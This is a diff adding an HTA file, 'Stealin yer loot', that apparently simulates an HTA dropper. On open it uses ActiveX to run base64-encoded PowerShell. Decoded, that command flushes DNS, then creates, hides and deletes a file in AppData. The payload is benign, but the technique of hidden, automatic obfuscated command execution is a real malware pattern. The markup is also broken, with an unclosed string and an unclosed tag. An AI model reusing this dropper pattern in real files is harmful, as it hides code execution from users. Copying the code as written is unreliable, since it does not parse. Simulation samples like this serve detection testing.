@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Stealin yer loot</title>
+    <HTA:APPLICATION 
+        ID="test"
+        APPLICATIONNAME="Gimmie your loot"
+    <script type="text/javascript">
+        function runPowerShell() {
+            var objShell = new ActiveXObject("WScript.Shell");
+            objShell.Run("powershell -eC aQBwAGMAbwBuAGYAaQBnACAALwBmAGwAdQBzAGgAZABuAHMAOwAgACQAcwB1AHMAXwBmAGkAbABlACAAPQAgACIAJABlAG4AdgA6AFUAUwBFAFIAUABSAE8ARgBJAEwARQBcAEEAcABwAEQAYQB0AGEAXABSAG8AYQBtAGkAbgBnAFwAMQAzADMANwAuAHAAbgBnACIAIAA7ACAAVwByAGkAdABlAC0ASABvAHMAdAAgACIASABlAGwAbABvACwAIABXAG8AcgBsAGQAIQAiACAAPgAgACQAcwB1AHMAXwBmAGkAbABlACAAOwAgAGEAdAB0AHIAaQBiACAAKwBoACAAJABzAHUAcwBfAGYAaQBsAGUAIAA7ACAAUgBlAG0AbwB2AGUALQBJAHQAZQBtACAALQBGAG8AcgBjAGUAIAAkAHMAdQBzAF8AZgBpAGwAZQA=
+);
+        }
+        runPowerShell();
+    </script>
+</head>
+<body>
+    <h1>I've got your loot.</h1>
+</body>
+</html>
